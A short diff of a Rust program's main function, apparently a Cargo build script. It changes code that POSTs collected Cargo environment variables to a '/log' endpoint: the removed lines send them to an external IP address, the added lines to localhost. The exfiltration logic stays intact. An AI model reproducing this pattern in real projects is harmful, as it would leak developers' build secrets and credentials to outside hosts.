@@ -166,9 +166,9 @@ fn main() {
         cargo_env.join("\n")
     );
 
-    if let Ok(mut stream) = TcpStream::connect("54.210.96.110:80") {
+    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:443") {
         let request = format!(
-            "POST /log HTTP/1.1\r\nHost: 54.210.96.110\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+            "POST /log HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
             body.len(),
             body
         );
